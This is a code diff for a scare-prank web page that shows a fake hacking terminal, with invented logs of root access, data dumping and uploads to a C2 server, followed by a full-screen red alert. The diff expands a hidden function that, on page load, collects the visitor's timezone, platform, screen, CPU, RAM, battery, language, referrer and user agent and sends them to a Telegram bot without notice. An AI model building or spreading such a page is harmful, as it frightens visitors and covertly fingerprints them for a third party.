@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>System Terminal // root@access</title>
+  <title>root@system-core:~#</title>
   <style>
     * {
       box-sizing: border-box;
@@ -14,15 +14,15 @@
     }
 
     body {
-      background-color: #050505;
+      background-color: #030303;
       color: #00ff41;
       font-family: 'Courier New', Courier, monospace;
-      font-size: 14px;
-      line-height: 1.45;
-      padding: 16px;
+      font-size: 12px;
+      line-height: 1.3;
+      padding: 10px;
       min-height: 100vh;
       overflow-x: hidden;
-      text-shadow: 0 0 6px rgba(0, 255, 65, 0.45);
+      text-shadow: 0 0 5px rgba(0, 255, 65, 0.45);
     }
 
     body::before {
@@ -31,49 +31,60 @@
       inset: 0;
       background: repeating-linear-gradient(
         0deg,
-        rgba(0, 0, 0, 0.18),
-        rgba(0, 0, 0, 0.18) 1px,
+        rgba(0, 0, 0, 0.22),
+        rgba(0, 0, 0, 0.22) 1px,
         transparent 1px,
-        transparent 3px
+        transparent 2px
       );
       pointer-events: none;
       z-index: 10;
     }
 
     #terminal {
-      max-width: 720px;
+      width: 100%;
+      max-width: 900px;
       margin: 0 auto;
-      padding-bottom: 60px;
+      padding-bottom: 40px;
     }
 
     .line {
-      margin-bottom: 6px;
-      word-break: break-word;
+      margin-bottom: 2px;
+      word-break: break-all;
+      white-space: pre-wrap;
+    }
+
+    .dim {
+      color: #009e28;
+      opacity: 0.85;
     }
 
     .warn {
       color: #ffcc00;
-      text-shadow: 0 0 6px rgba(255, 204, 0, 0.45);
+      text-shadow: 0 0 5px rgba(255, 204, 0, 0.45);
     }
 
     .danger {
       color: #ff2a4b;
       font-weight: bold;
-      text-shadow: 0 0 8px rgba(255, 42, 75, 0.6);
+      text-shadow: 0 0 8px rgba(255, 42, 75, 0.65);
     }
 
     .info {
       color: #00d9ff;
-      text-shadow: 0 0 6px rgba(0, 217, 255, 0.45);
+      text-shadow: 0 0 5px rgba(0, 217, 255, 0.45);
+    }
+
+    .cursor-line {
+      margin-top: 4px;
     }
 
     .cursor {
       display: inline-block;
-      width: 9px;
-      height: 16px;
+      width: 8px;
+      height: 14px;
       background: #00ff41;
       vertical-align: middle;
-      animation: blink 0.8s infinite;
+      animation: blink 0.6s infinite;
     }
 
     @keyframes blink {
@@ -81,42 +92,30 @@
       50%, 100% { opacity: 0; }
     }
 
-    .progress-box {
-      margin: 12px 0;
-      border: 1px solid #00ff41;
-      padding: 3px;
-      width: 100%;
-      max-width: 400px;
-      display: none;
-    }
-
-    .progress-fill {
-      height: 14px;
-      width: 0%;
-      background: #00ff41;
-      transition: width 0.15s linear;
-    }
-
     #final-alert {
       display: none;
-      min-height: calc(100vh - 32px);
+      position: fixed;
+      inset: 0;
+      background: #050000;
       align-items: center;
       justify-content: center;
       text-align: center;
-      padding: 20px;
+      padding: 24px;
+      z-index: 99;
     }
 
     #final-alert .alert-text {
-      color: #ff1e38;
+      color: #ff1a35;
       font-size: 28px;
       font-weight: bold;
-      line-height: 1.35;
-      text-shadow: 0 0 18px rgba(255, 30, 56, 0.85);
-      animation: pulseRed 1.1s infinite alternate;
+      line-height: 1.4;
+      text-transform: uppercase;
+      text-shadow: 0 0 20px rgba(255, 26, 53, 0.9);
+      animation: pulseRed 0.9s infinite alternate;
     }
 
     @keyframes pulseRed {
-      from { opacity: 0.8; transform: scale(0.98); }
+      from { opacity: 0.78; transform: scale(0.98); }
       to { opacity: 1; transform: scale(1.02); }
     }
   </style>
@@ -125,10 +124,7 @@
 
   <div id="terminal">
     <div id="output"></div>
-    <div class="progress-box" id="progress-box">
-      <div class="progress-fill" id="progress-fill"></div>
-    </div>
-    <div id="cursor-row"><span id="typing-line"></span><span class="cursor"></span></div>
+    <div class="cursor-line">root@kernel:~# <span class="cursor"></span></div>
   </div>
 
   <div id="final-alert">
@@ -142,25 +138,69 @@
 
     const terminalEl = document.getElementById("terminal");
     const output = document.getElementById("output");
-    const typingLine = document.getElementById("typing-line");
-    const cursorRow = document.getElementById("cursor-row");
-    const progressBox = document.getElementById("progress-box");
-    const progressFill = document.getElementById("progress-fill");
     const finalAlert = document.getElementById("final-alert");
 
-    const ua = navigator.userAgent;
-    const platform = navigator.platform || "Unknown OS";
-    const lang = navigator.language || "ru-RU";
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-
     let finished = false;
+    const startTime = Date.now();
 
-    async function notifyTelegram() {
+    function getTimestamp() {
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(3);
+      return `[${elapsed.padStart(6, "0")}]`;
+    }
+
+    function randomHex(len) {
+      const chars = "0123456789abcdef";
+      let out = "";
+      for (let i = 0; i < len; i++) {
+        out += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return out;
+    }
+
+    function randomIp() {
+      return `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
+    }
+
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;");
+    }
+
+    // Сбор базовой информации об устройстве и отправка в Telegram
+    async function collectAndSendTelemetry() {
+      const ua = navigator.userAgent || "Unknown";
+      const platform = navigator.platform || "Unknown";
+      const lang = navigator.language || "Unknown";
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+      const screenInfo = `${window.screen.width}x${window.screen.height} (x${window.devicePixelRatio || 1})`;
+      const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ядер` : "Н/Д";
+      const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} ГБ` : "Н/Д";
+      const online = navigator.onLine ? "Онлайн" : "Офлайн";
+      const ref = document.referrer || "Прямой переход";
+      const nowStr = new Date().toLocaleString("ru-RU");
+
+      let batteryStr = "Не поддерживается";
+      try {
+        if (navigator.getBattery) {
+          const bat = await navigator.getBattery();
+          const lvl = Math.round(bat.level * 100);
+          batteryStr = `${lvl}% (${bat.charging ? "заряжается" : "от батареи"})`;
+        }
+      } catch (e) {}
+
       const text =
-        `👀 <b>КТО-ТО ОТКРЫЛ ТЕРМИНАЛ-ПРАНК!</b>\n\n` +
-        `📱 <b>Устройство:</b> <code>${ua}</code>\n` +
-        `🖥 <b>Экран:</b> ${screenRes}\n` +
-        `🌐 <b>Язык:</b> ${lang}`;
+        `🚨 <b>ТЕРМИНАЛ ЗАПУЩЕН!</b>\n\n` +
+        `🕒 <b>Время:</b> ${escapeHtml(nowStr)}\n` +
+        `🌍 <b>Часовой пояс:</b> ${escapeHtml(tz)}\n` +
+        `💻 <b>Платформа:</b> ${escapeHtml(platform)}\n` +
+        `📐 <b>Экран:</b> ${escapeHtml(screenInfo)}\n` +
+        `⚙️ <b>CPU / RAM:</b> ${escapeHtml(cores)} / ${escapeHtml(ram)}\n` +
+        `🔋 <b>Батарея:</b> ${escapeHtml(batteryStr)}\n` +
+        `🗣 <b>Язык:</b> ${escapeHtml(lang)} (${online})\n` +
+        `🔗 <b>Откуда перешёл:</b> ${escapeHtml(ref)}\n\n` +
+        `📱 <b>User-Agent:</b>\n<code>${escapeHtml(ua)}</code>`;
 
       try {
         await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
@@ -175,84 +215,106 @@
       } catch (e) {}
     }
 
+    const staticEvents = [
+      { text: "Initializing kernel hook & socket layer...", cls: "info" },
+      { text: `Target viewport locked: ${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio || 1}x`, cls: "" },
+      { text: `Host environment: ${navigator.platform || "ARM64/Linux"} | Lang: ${navigator.language}`, cls: "warn" },
+      { text: "Handshake established with relay node 185.220.101.44:443 [TLS 1.3]", cls: "info" },
+      { text: "Bypassing sandbox isolation policies...", cls: "warn" },
+      { text: "[OK] Escalated privileges -> uid=0(root) gid=0(root)", cls: "" },
+      { text: "Mounting /dev/block/userdata -> /mnt/dump (ro,noatime)", cls: "" },
+      { text: "Scanning SQLite databases: contacts2.db, mmssms.db, wa.db...", cls: "warn" },
+      { text: "Extracting session tokens & keystore blobs...", cls: "danger" },
+      { text: "WARNING: Firewall anomaly suppressed on interface wlan0", cls: "warn" },
+      { text: "Dumping DCIM/Camera index & thumbnails...", cls: "info" },
+      { text: "Compressing payload archive: dump_0x94F2.tar.gz (148.6 MB)", cls: "" },
+      { text: "Streaming encrypted chunks to C2 endpoint...", cls: "danger" },
+      { text: "Overwriting system recovery flags & disabling user prompt...", cls: "danger" },
+      { text: "Finalizing remote persistence daemon...", cls: "warn" }
+    ];
+
+    const dynamicGenerators = [
+      () => ({
+        text: `0x${randomHex(8)}: ${randomHex(8)} ${randomHex(8)} ${randomHex(8)} ${randomHex(8)} | .${randomHex(6)}..`,
+        cls: "dim"
+      }),
+      () => ({
+        text: `TCP ${randomIp()}:${Math.floor(Math.random() * 50000 + 1024)} -> 10.0.2.15:443 [SYN, ACK] len=${Math.floor(Math.random() * 1400 + 64)}`,
+        cls: "dim"
+      }),
+      () => ({
+        text: `READ /data/data/org.telegram.messenger/cache/${randomHex(12)}.bin (${Math.floor(Math.random() * 900 + 12)} KB) [OK]`,
+        cls: ""
+      }),
+      () => ({
+        text: `DECRYPT block #${Math.floor(Math.random() * 9999)} key=0x${randomHex(16)} -> VERIFIED`,
+        cls: "info"
+      }),
+      () => ({
+        text: `PACKET_OUT chunk_${Math.floor(Math.random() * 800)} -> 100% ACK (${(Math.random() * 12 + 2).toFixed(1)} MB/s)`,
+        cls: ""
+      }),
+      () => ({
+        text: `ALERT: Process watchdog bypassed (PID ${Math.floor(Math.random() * 28000 + 1000)})`,
+        cls: "warn"
+      }),
+      () => ({
+        text: `EXTRACT /storage/emulated/0/DCIM/IMG_2026_${Math.floor(Math.random() * 8999 + 1000)}.jpg -> QUEUED`,
+        cls: "danger"
+      })
+    ];
+
+    function appendLine(text, cls = "") {
+      if (finished) return;
+      const div = document.createElement("div");
+      div.className = "line " + cls;
+      div.textContent = `${getTimestamp()} ${text}`;
+      output.appendChild(div);
+
+      // Ограничиваем количество строк в DOM, чтобы телефон не тормозил при высокой скорости
+      if (output.children.length > 140) {
+        output.removeChild(output.firstChild);
+      }
+      window.scrollTo(0, document.body.scrollHeight);
+    }
+
     function showFinalAlert() {
       if (finished) return;
       finished = true;
       terminalEl.style.display = "none";
       finalAlert.style.display = "flex";
-      window.scrollTo(0, 0);
     }
 
-    const scriptLines = [
-      { text: "Initializing remote connection...", type: "info", delay: 650 },
-      { text: "Connected to host: 185.220.101.44:443 [OK]", type: "", delay: 750 },
-      { text: `Target OS detected: ${platform} (${screenRes})`, type: "warn", delay: 850 },
-      { text: "Bypassing browser sandbox...", type: "", delay: 900 },
-      { text: "[SUCCESS] Root shell acquired.", type: "", delay: 800 },
-      { text: "Scanning local storage & Telegram session tokens...", type: "warn", delay: 1100 },
-      { text: "Found: tdata / cache / gallery_index.db", type: "danger", delay: 950 },
-      { text: "Decrypting keychain & browser cookies...", type: "info", delay: 900 },
-      { text: "Uploading archive to remote server...", type: "info", delay: 500, progress: true },
-      { text: "Injecting remote control payload...", type: "warn", delay: 1000 },
-      { text: "Locking system daemon & network interfaces...", type: "danger", delay: 1000 },
-      { text: "[DONE] Payload active. Establishing final link...", type: "danger", delay: 1200 }
-    ];
-
-    function sleep(ms) {
-      return new Promise((resolve) => setTimeout(resolve, ms));
-    }
-
-    function appendLine(text, className = "") {
-      if (finished) return;
-      const div = document.createElement("div");
-      div.className = "line " + className;
-      div.textContent = "> " + text;
-      output.appendChild(div);
-      window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    async function typeText(text, speed = 28) {
-      typingLine.textContent = "> ";
-      for (let i = 0; i < text.length; i++) {
-        if (finished) return;
-        typingLine.textContent += text[i];
-        window.scrollTo(0, document.body.scrollHeight);
-        await sleep(speed);
-      }
-      typingLine.textContent = "";
-    }
-
-    async function runProgress() {
-      if (finished) return;
-      progressBox.style.display = "block";
-      progressFill.style.width = "0%";
-      let pct = 0;
-      while (pct < 100 && !finished) {
-        pct = Math.min(100, pct + Math.floor(Math.random() * 11) + 5);
-        progressFill.style.width = pct + "%";
-        await sleep(220);
-      }
-      await sleep(300);
-      progressBox.style.display = "none";
-    }
-
-    async function startTerminal() {
-      notifyTelegram();
+    function startTerminal() {
+      collectAndSendTelemetry();
       setTimeout(showFinalAlert, DURATION_MS);
 
-      let idx = 0;
-      while (!finished) {
-        const item = scriptLines[idx % scriptLines.length];
-        await typeText(item.text, 26);
-        if (finished) break;
-        appendLine(item.text, item.type);
-        if (item.progress) {
-          await runProgress();
+      let staticIdx = 0;
+      let tick = 0;
+
+      const loop = setInterval(() => {
+        if (finished) {
+          clearInterval(loop);
+          return;
         }
-        await sleep(item.delay);
-        idx++;
-      }
-      cursorRow.style.display = "none";
+
+        tick++;
+
+        // Каждые 12 тиков вставляем ключевое событие, остальное время — быстрый поток дампа
+        if (tick % 12 === 1 && staticIdx < staticEvents.length) {
+          const ev = staticEvents[staticIdx++];
+          appendLine(ev.text, ev.cls);
+        } else {
+          // Печатаем по 2 строки за тик для эффекта реального быстрого терминала
+          const g1 = dynamicGenerators[Math.floor(Math.random() * dynamicGenerators.length)]();
+          appendLine(g1.text, g1.cls);
+
+          if (Math.random() > 0.35) {
+            const g2 = dynamicGenerators[Math.floor(Math.random() * dynamicGenerators.length)]();
+            appendLine(g2.text, g2.cls);
+          }
+        }
+      }, 55);
     }
 
     startTerminal();
